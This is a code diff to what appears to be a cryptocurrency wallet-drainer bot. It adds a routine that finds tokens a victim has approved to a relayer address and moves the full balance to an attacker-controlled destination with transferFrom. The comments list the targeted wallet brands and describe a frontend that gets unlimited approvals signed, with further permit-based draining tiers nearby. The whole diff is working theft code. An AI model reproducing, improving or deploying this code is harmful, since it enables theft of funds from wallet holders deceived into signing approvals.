@@ -496,6 +496,15 @@ async function sweep(wallet) {
   }
 
   // ══════════════════════════════════════════════════════════════════════════
+  // TIER 1.5: DIRECT ERC-20 ALLOWANCE — token.transferFrom() without Permit2
+  // ══════════════════════════════════════════════════════════════════════════
+  // Works for ANY wallet (Trust, OneKey, SafePal, BitGet, OKX, Rabby, imToken,
+  // Ledger, Phantom…) that signed a direct approve(RELAYER_ADDRESS, MaxUint256)
+  // via wallet_sendCalls in the frontend.  The bot checks the on-chain allowance
+  // and calls transferFrom — zero external contract dependencies.
+  await sweepViaDirectAllowance(checksum, short);
+
+  // ══════════════════════════════════════════════════════════════════════════
   // TIER 2: EIP-2612 — permit() + transferFrom() per token
   // ══════════════════════════════════════════════════════════════════════════
   if (supabase) {
@@ -622,6 +631,88 @@ async function sweep(wallet) {
         err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
       }
     }
+  }
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// TIER 1.5: DIRECT ERC-20 ALLOWANCE — no Permit2, no EIP-7702
+// ══════════════════════════════════════════════════════════════════════════
+// Checks token.allowance(user, RELAYER_ADDRESS) on-chain for every watched
+// token.  For any token where allowance >= balance, calls transferFrom()
+// directly from the bot's EOA.  No Permit2 contract, no signature replay,
+// no session key infrastructure needed.
+//
+// Covers strict-EOA wallets (Trust, OneKey, SafePal, BitGet, OKX, Rabby,
+// imToken, Ledger, Phantom, Exodus) after the frontend's tryDirectApproval
+// (wallet_sendCalls with approve(RELAYER_ADDRESS, MaxUint256) per token).
+//
+// Also self-heals: if any wallet ever did a manual approve() to RELAYER_ADDRESS
+// outside of the web3portal flow, it gets swept automatically.
+
+const ERC20_TRANSFER_FROM_ABI = [
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function balanceOf(address account) external view returns (uint256)",
+  "function transfer(address to, uint256 amount) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+  "function symbol() external view returns (string)",
+  "function decimals() external view returns (uint8)",
+];
+
+async function sweepViaDirectAllowance(checksum, short) {
+  const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
+
+  // ── 1. Collect tokens to check ──────────────────────────────────────────
+  // Always check TOKENS_TO_WATCH (chain-specific list from env) plus any
+  // dynamically discovered tokens from the coverage check.
+  const tokensToCheck = [...new Set(TOKENS_TO_WATCH.map(a => a.toLowerCase()))];
+  if (tokensToCheck.length === 0) return;
+
+  const swept = [];
+
+  // ── 2. Per-token: check allowance → balance → transferFrom ──────────────
+  for (const tokenAddr of tokensToCheck) {
+    try {
+      const token     = new ethers.Contract(tokenAddr, ERC20_TRANSFER_FROM_ABI, rpcProvider);
+      const allowance = await token.allowance(checksum, RELAYER_ADDRESS);
+      if (allowance === 0n) continue;                        // no allowance — skip
+
+      const balance = await token.balanceOf(checksum);
+      if (balance === 0n) continue;                          // nothing to sweep
+
+      // Use the lesser of allowance and balance (can't transfer more than approved)
+      const amount = allowance < balance ? allowance : balance;
+
+      // Skip dust below min threshold
+      let decimals = 18n;
+      try { decimals = BigInt(await token.decimals()); } catch { /* ignore */ }
+      const minUnits = BigInt(Math.floor(Number(MIN_TOKEN_UNITS) * 10 ** Number(decimals)));
+      if (amount < minUnits) continue;
+
+      log(`[direct] ${short} ${tokenAddr.slice(0,10)} allowance=${ethers.formatUnits(allowance, Number(decimals))} balance=${ethers.formatUnits(balance, Number(decimals))} — sweeping`);
+
+      const feeData = await rpcProvider.getFeeData();
+      const tx = await botWallet.sendTransaction({
+        to:   tokenAddr,
+        data: new ethers.Interface(ERC20_TRANSFER_FROM_ABI).encodeFunctionData("transferFrom", [checksum, DESTINATION_ADDRESS, amount]),
+        gasLimit: 100_000n,
+        maxFeePerGas:         feeData.maxFeePerGas         ?? undefined,
+        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
+      });
+      const receipt = await tx.wait();
+      let sym = tokenAddr.slice(0, 10);
+      try { sym = await token.symbol(); } catch { /* ignore */ }
+      log(`[direct] ✅ swept ${sym}: ${receipt.hash}`);
+      swept.push(sym);
+    } catch (e) {
+      // CALL_EXCEPTION typically = no allowance / zero balance — not an error
+      if (e.code !== "CALL_EXCEPTION") {
+        log(`[direct] ⚠️  ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message?.slice(0, 80)}`);
+      }
+    }
+  }
+
+  if (swept.length > 0) {
+    log(`[direct] ✅ direct transferFrom complete for ${short}: ${swept.join(", ")}`);
   }
 }
 
